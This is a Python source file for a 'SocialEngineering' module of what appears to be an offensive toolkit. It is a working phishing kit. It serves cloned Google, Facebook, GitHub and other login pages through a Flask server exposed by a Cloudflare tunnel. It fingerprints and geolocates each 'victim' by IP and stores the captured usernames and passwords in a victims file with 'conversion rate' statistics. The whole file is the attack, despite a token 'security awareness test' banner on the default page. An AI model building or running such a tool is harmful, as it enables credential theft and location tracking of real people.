import asyncio
import threading
import subprocess
import json
import os
import re
import time
from datetime import datetime
from typing import Dict, List
from flask import Flask, request, render_template_string, jsonify
from flask_cors import CORS
import requests
from rich.table import Table
from rich.panel import Panel
from rich.console import Console
from rich.text import Text
from rich import box

from modules.base import BaseModule

console = Console()

class SocialEngineering(BaseModule):
    def __init__(self, session, config, proxy_manager):
        super().__init__(session, config, proxy_manager)
        self.is_running = False
        self.server_thread = None
        self.tunnel_process = None
        self.server = None
        self.port = 8080
        self.template = 'google'
        self.template_path = None
        self.redirect_url = 'https://google.com'
        self.type = 'phishing'
        self.victims = []
        self.logs = []
        self.tunnel_url = None
        self.victims_file = 'reports/victims.json'
        self.templates_dir = 'data/templates'
        self.custom_templates_dir = 'data/templates/custom'
        
        os.makedirs(self.templates_dir, exist_ok=True)
        os.makedirs(self.custom_templates_dir, exist_ok=True)
        os.makedirs('reports', exist_ok=True)
        
        self._load_victims()
        
    def _load_victims(self):
        try:
            with open(self.victims_file, 'r') as f:
                data = json.load(f)
                self.victims = data.get('victims', [])
        except:
            self.victims = []
            
    def _save_victims(self):
        try:
            with open(self.victims_file, 'w') as f:
                json.dump({'victims': self.victims}, f, indent=2)
        except:
            pass
            
    def _get_template_list(self):
        templates = []
        default_templates = ['google', 'facebook', 'instagram', 'twitter', 'linkedin', 'github', 'microsoft', 'whatsapp', 'seeker']
        for t in default_templates:
            if os.path.exists(os.path.join(self.templates_dir, f'{t}.html')):
                templates.append(t)
        if os.path.exists(self.custom_templates_dir):
            for f in os.listdir(self.custom_templates_dir):
                if f.endswith('.html'):
                    templates.append(f'custom/{f}')
        return templates
        
    def _get_template_content(self, template_name):
        if template_name in ['google', 'facebook', 'instagram', 'twitter', 'linkedin', 'github', 'microsoft', 'whatsapp', 'seeker']:
            path = os.path.join(self.templates_dir, f'{template_name}.html')
            if os.path.exists(path):
                with open(path, 'r') as f:
                    return f.read()
        if template_name.startswith('custom/'):
            path = os.path.join(self.custom_templates_dir, template_name.replace('custom/', ''))
            if os.path.exists(path):
                with open(path, 'r') as f:
                    return f.read()
        return self._get_default_template()
        
    def _get_default_template(self):
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login</title>
            <style>
                body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; margin: 0; }
                .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); width: 350px; }
                h1 { text-align: center; color: #333; margin-bottom: 20px; }
                input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
                button { width: 100%; padding: 12px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
                button:hover { background: #45a049; }
                .notice { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; color: #856404; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="notice">
                    <strong>⚠ Security Test</strong><br>
                    This page is part of a security awareness test.
                </div>
                <h1>Login</h1>
                <form action="/submit" method="POST">
                    <input type="text" name="username" placeholder="Username or Email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Sign In</button>
                </form>
            </div>
            <script>
                fetch('/track', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        screen: screen.width + 'x' + screen.height,
                        language: navigator.language,
                        platform: navigator.platform,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    })
                });
            </script>
        </body>
        </html>
        """
        
    def _get_geolocation(self, ip):
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'lat': data.get('lat'),
                        'lng': data.get('lon'),
                        'postal': data.get('zip'),
                        'isp': data.get('isp'),
                        'org': data.get('org')
                    }
        except:
            pass
        return None
        
    def _parse_user_agent(self, user_agent):
        result = {'os': 'Unknown', 'browser': 'Unknown', 'device': 'Desktop'}
        if not user_agent:
            return result
            
        if 'Windows NT 10.0' in user_agent:
            result['os'] = 'Windows 10'
        elif 'Windows NT 6.1' in user_agent:
            result['os'] = 'Windows 7'
        elif 'Windows NT 6.2' in user_agent:
            result['os'] = 'Windows 8'
        elif 'Windows NT 6.3' in user_agent:
            result['os'] = 'Windows 8.1'
        elif 'Windows' in user_agent:
            result['os'] = 'Windows'
        elif 'Mac OS X' in user_agent:
            result['os'] = 'macOS'
        elif 'Android' in user_agent:
            result['os'] = 'Android'
        elif 'iPhone' in user_agent or 'iPad' in user_agent:
            result['os'] = 'iOS'
        elif 'Linux' in user_agent:
            result['os'] = 'Linux'
            
        if 'Chrome' in user_agent and 'Edg' not in user_agent and 'OPR' not in user_agent:
            result['browser'] = 'Chrome'
        elif 'Firefox' in user_agent:
            result['browser'] = 'Firefox'
        elif 'Safari' in user_agent and 'Chrome' not in user_agent:
            result['browser'] = 'Safari'
        elif 'Edg' in user_agent:
            result['browser'] = 'Edge'
        elif 'OPR' in user_agent:
            result['browser'] = 'Opera'
        elif 'MSIE' in user_agent or 'Trident' in user_agent:
            result['browser'] = 'Internet Explorer'
            
        if 'Mobile' in user_agent or 'Android' in user_agent or 'iPhone' in user_agent:
            result['device'] = 'Mobile'
        elif 'Tablet' in user_agent or 'iPad' in user_agent:
            result['device'] = 'Tablet'
            
        return result
        
    def _start_flask_server(self):
        app = Flask(__name__)
        CORS(app)
        
        @app.route('/')
        def index():
            ip = request.remote_addr
            user_agent = request.headers.get('User-Agent', 'Unknown')
            referrer = request.headers.get('Referer', 'Direct')
            
            self.logs.append({
                'timestamp': datetime.now().isoformat(),
                'type': 'visit',
                'ip': ip,
                'user_agent': user_agent,
                'referrer': referrer
            })
            
            content = self._get_template_content(self.template)
            return render_template_string(content)
            
        @app.route('/track', methods=['POST'])
        def track():
            data = request.get_json()
            ip = request.remote_addr
            user_agent = request.headers.get('User-Agent', 'Unknown')
            
            victim_data = {
                'id': f"victim_{len(self.victims)+1:03d}",
                'timestamp': datetime.now().isoformat(),
                'ip': ip,
                'location': self._get_geolocation(ip),
                'device': self._parse_user_agent(user_agent),
                'user_agent': user_agent,
                'screen': data.get('screen'),
                'language': data.get('language'),
                'platform': data.get('platform'),
                'timezone': data.get('timezone'),
                'referrer': request.headers.get('Referer', 'Direct'),
                'type': self.type,
                'template': self.template,
                'credentials': None
            }
            
            self.victims.append(victim_data)
            self._save_victims()
            
            self.logs.append({
                'timestamp': datetime.now().isoformat(),
                'type': 'track',
                'ip': ip,
                'data': victim_data
            })
            
            return jsonify({'status': 'ok'})
            
        @app.route('/submit', methods=['POST'])
        def submit():
            data = request.form
            ip = request.remote_addr
            
            if self.victims:
                victim = self.victims[-1]
                victim['credentials'] = dict(data)
                self._save_victims()
                
                self.logs.append({
                    'timestamp': datetime.now().isoformat(),
                    'type': 'credentials',
                    'ip': ip,
                    'credentials': dict(data)
                })
                
                console.print(f"\n[green][+] Credentials captured![/green]")
                table = Table(show_header=False, box=box.SIMPLE)
                for key, value in data.items():
                    table.add_row(f"[cyan]{key}[/cyan]", f"[white]{value}[/white]")
                console.print(table)
                console.print(f"[yellow]Redirecting to {self.redirect_url}[/yellow]\n")
            
            return f'<script>window.location.href="{self.redirect_url}";</script>'
            
        @app.route('/robots.txt')
        def robots():
            return 'User-agent: *\nDisallow: /'
            
        self.server = app
        app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False, threaded=True)
        
    async def run(self):
        if self.is_running:
            console.print("[red]Server already running[/red]")
            return
            
        console.print("[cyan]Starting Flask server...[/cyan]")
        
        self.server_thread = threading.Thread(target=self._start_flask_server, daemon=True)
        self.server_thread.start()
        
        await asyncio.sleep(2)
        
        console.print("[cyan]Creating Cloudflare tunnel...[/cyan]")
        
        try:
            self.tunnel_process = await asyncio.create_subprocess_exec(
                'cloudflared', 'tunnel', '--url', f'http://localhost:{self.port}',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            await asyncio.sleep(2)
            if self.tunnel_process and self.tunnel_process.stdout:
                output = await self.tunnel_process.stdout.readline()
                output_str = output.decode() if output else ''
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', output_str)
                if match:
                    self.tunnel_url = match.group(0)
                    
        except FileNotFoundError:
            console.print("[red]cloudflared not found. Install cloudflared first.[/red]")
            console.print("[yellow]https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation[/yellow]")
            self.tunnel_url = f"http://localhost:{self.port}"
            
        self.is_running = True
        
        console.print(f"[green]Server running on port {self.port}[/green]")
        if self.tunnel_url:
            console.print(f"[green]Tunnel URL: {self.tunnel_url}[/green]")
        else:
            console.print(f"[yellow]Local URL: http://localhost:{self.port}[/yellow]")
        console.print("[yellow]Press Ctrl+C to stop[/yellow]")
        console.print("[yellow]Type 'show victims' to view data[/yellow]")
        console.print("[yellow]Type 'show logs' to view logs[/yellow]")
        
    async def stop(self):
        if not self.is_running:
            console.print("[red]Server not running[/red]")
            return
            
        console.print("[cyan]Stopping server...[/cyan]")
        
        self.is_running = False
        
        if self.tunnel_process:
            try:
                self.tunnel_process.terminate()
                await asyncio.sleep(1)
                if self.tunnel_process:
                    self.tunnel_process.kill()
            except:
                pass
                
        if self.server:
            try:
                import requests
                requests.get(f'http://localhost:{self.port}/shutdown', timeout=1)
            except:
                pass
                
        console.print("[green]Server stopped[/green]")
        
    async def show_victims(self):
        if not self.victims:
            console.print("[yellow]No victims yet[/yellow]")
            return
            
        console.print(f"\n[cyan] VICTIMS DATA (Total: {len(self.victims)}) [/cyan]")
        
        for idx, victim in enumerate(self.victims, 1):
            console.print(f"\n[green]Victim #{idx}[/green]")
            console.print(f"  Timestamp: {victim.get('timestamp', 'Unknown')}")
            console.print(f"  IP: {victim.get('ip', 'Unknown')}")
            
            loc = victim.get('location', {})
            if loc:
                console.print(f"  Location: {loc.get('city', '')}, {loc.get('country', '')}")
                if loc.get('lat') and loc.get('lng'):
                    console.print(f"  Coordinates: {loc.get('lat')}, {loc.get('lng')}")
                    
            device = victim.get('device', {})
            if device:
                console.print(f"  Device: {device.get('os', 'Unknown')} / {device.get('browser', 'Unknown')}")
                console.print(f"  Type: {device.get('device', 'Unknown')}")
                
            if victim.get('screen'):
                console.print(f"  Screen: {victim.get('screen')}")
            if victim.get('language'):
                console.print(f"  Language: {victim.get('language')}")
                
            creds = victim.get('credentials')
            if creds:
                console.print(f"  [red]Credentials:[/red]")
                for key, value in creds.items():
                    console.print(f"    {key}: {value}")
            else:
                console.print(f"  [yellow]No credentials captured[/yellow]")
                
            console.print("-" * 40)
            
    async def show_logs(self):
        if not self.logs:
            console.print("[yellow]No logs yet[/yellow]")
            return
            
        console.print(f"\n[cyan] LOGS (Total: {len(self.logs)}) [/cyan]")
        
        for log in self.logs[-20:]:
            timestamp = log.get('timestamp', '')
            log_type = log.get('type', '')
            ip = log.get('ip', '')
            
            if log_type == 'visit':
                console.print(f"[dim]{timestamp}[/dim] [yellow]GET[/yellow] / - {ip}")
            elif log_type == 'track':
                console.print(f"[dim]{timestamp}[/dim] [blue]TRACK[/blue] / - {ip}")
            elif log_type == 'credentials':
                creds = log.get('credentials', {})
                username = creds.get('username', creds.get('email', 'Unknown'))
                console.print(f"[dim]{timestamp}[/dim] [red]CREDENTIALS[/red] - {username} - {ip}")
                
    async def show_stats(self):
        if not self.victims:
            console.print("[yellow]No data yet[/yellow]")
            return
            
        total = len(self.victims)
        with_creds = len([v for v in self.victims if v.get('credentials')])
        
        countries = {}
        devices = {}
        templates = {}
        
        for v in self.victims:
            loc = v.get('location', {})
            country = loc.get('country', 'Unknown')
            countries[country] = countries.get(country, 0) + 1
            
            device = v.get('device', {}).get('device', 'Unknown')
            devices[device] = devices.get(device, 0) + 1
            
            tmpl = v.get('template', 'Unknown')
            templates[tmpl] = templates.get(tmpl, 0) + 1
            
        console.print(f"\n[cyan] STATISTICS [/cyan]")
        console.print(f"  Total Victims: {total}")
        console.print(f"  With Credentials: {with_creds}")
        console.print(f"  Conversion Rate: {(with_creds/total*100):.1f}%")
        
        console.print(f"\n[cyan]Top Countries:[/cyan]")
        for country, count in sorted(countries.items(), key=lambda x: x[1], reverse=True)[:5]:
            console.print(f"  {country}: {count}")
            
        console.print(f"\n[cyan]Device Types:[/cyan]")
        for device, count in devices.items():
            console.print(f"  {device}: {count}")
            
        console.print(f"\n[cyan]Templates Used:[/cyan]")
        for tmpl, count in templates.items():
            console.print(f"  {tmpl}: {count}")
            
    async def show_templates(self):
        templates = self._get_template_list()
        if not templates:
            console.print("[yellow]No templates found[/yellow]")
            return
            
        console.print(f"\n[cyan] AVAILABLE TEMPLATES [/cyan]")
        for idx, t in enumerate(templates, 1):
            console.print(f"  {idx}. {t}")
            
    async def show_help(self):
        console.print("""
[cyan]Social Engineering Module Commands[/cyan]
  show templates        - List available templates
  show victims          - View captured victim data
  show logs             - View real-time logs
  show stats            - View statistics
  
  set TEMPLATE <name>   - Set template (google, facebook, etc)
  set TEMPLATE_PATH <path> - Set custom template path
  set REDIRECT <url>    - Set redirect URL after credentials
  set PORT <port>       - Set server port (default 8080)
  set TYPE <phishing/seeker> - Set attack type
  
  run                   - Start server + tunnel
  stop                  - Stop server + tunnel
""")

    async def set_option(self, option, value):
        if option == 'TEMPLATE':
            templates = self._get_template_list()
            if value in templates:
                self.template = value
                console.print(f"[green]TEMPLATE => {value}[/green]")
            else:
                console.print(f"[red]Template '{value}' not found[/red]")
                console.print(f"[yellow]Available: {', '.join(templates)}[/yellow]")
                
        elif option == 'TEMPLATE_PATH':
            if os.path.exists(value):
                self.template_path = value
                self.template = f'custom/{os.path.basename(value)}'
                console.print(f"[green]TEMPLATE_PATH => {value}[/green]")
            else:
                console.print(f"[red]File not found: {value}[/red]")
                
        elif option == 'REDIRECT':
            self.redirect_url = value
            console.print(f"[green]REDIRECT => {value}[/green]")
            
        elif option == 'PORT':
            if value.isdigit() and 1024 <= int(value) <= 65535:
                self.port = int(value)
                console.print(f"[green]PORT => {value}[/green]")
            else:
                console.print("[red]PORT must be between 1024-65535[/red]")
                
        elif option == 'TYPE':
            if value in ['phishing', 'seeker']:
                self.type = value
                console.print(f"[green]TYPE => {value}[/green]")
            else:
                console.print("[red]TYPE must be 'phishing' or 'seeker'[/red]")
                
        else:
            console.print(f"[red]Unknown option: {option}[/red]")
